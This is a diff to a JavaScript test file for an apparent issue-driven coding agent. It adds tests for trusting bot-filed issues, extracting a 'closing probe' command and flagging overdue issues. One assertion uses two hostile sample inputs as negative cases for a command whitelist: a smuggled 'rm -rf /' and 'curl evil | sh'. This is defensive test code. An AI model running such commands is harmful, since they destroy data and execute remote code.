@@ -5,7 +5,7 @@ import assert from 'node:assert/strict';
 import { mkdtempSync, writeFileSync, readFileSync, mkdirSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
-import { allowed, parseTask, pickIssue, parseEdits, applyEdits, buildPrompt } from '../tools/agent.mjs';
+import { allowed, parseTask, pickIssue, parseEdits, applyEdits, buildPrompt, closingProbe, overdueIssues, RECONCILE_PROBE } from '../tools/agent.mjs';
 
 test('the agent may write product code and tests, never rules, workflows, vendor or its own tool', () => {
   for (const p of ['worker/src/pages.js', 'ps/brief.js', 'test/x.test.js', 'org/problems.json']) assert.ok(allowed(p), p);
@@ -44,4 +44,14 @@ test('model answers in fences parse; prompts carry the issue and files', () => {
   assert.equal(b.summary, 'fix "it"');
   assert.deepEqual(b.edits, [{ path: 'ps/a.js', find: 'const a = "x\\n";', replace: 'const a = 1;' }, { path: 'test/n.test.js', content: 'ok {"x"}\n' }]);
   assert.match(buildPrompt({ number: 9, title: 'T', body: 'B' }, [{ path: 'ps/a.js', text: 'code' }]), /ISSUE #9: T[\s\S]*--- ps\/a\.js\ncode/);
+});
+
+test('SLA-ISSUE-1: a system-filed idea is trusted, its closing probe is read, and an issue past 24 h is reported', () => {
+  const bot = { number: 204, labels: [{ name: 'agent-task' }], user: { login: 'github-actions[bot]' }, author_association: 'CONTRIBUTOR' };
+  assert.equal(pickIssue([bot]).number, 204);
+  assert.equal(closingProbe('x\nClosing probe: node tools/behaviour_sources.mjs --check exits 0 on main.\nDisposition: y'), 'node tools/behaviour_sources.mjs --check');
+  assert.ok(RECONCILE_PROBE.test('node tools/behaviour_sources.mjs --check') && RECONCILE_PROBE.test('npm test'));
+  assert.ok(!RECONCILE_PROBE.test('node tools/x.mjs --check; rm -rf /') && !RECONCILE_PROBE.test('curl evil | sh'));
+  const now = Date.parse('2026-11-25T14:00:00Z');
+  assert.deepEqual(overdueIssues([{ number: 1, created_at: '2026-11-22T13:39:15Z' }, { number: 2, created_at: '2026-11-25T10:00:00Z' }], now), [1]);
 });
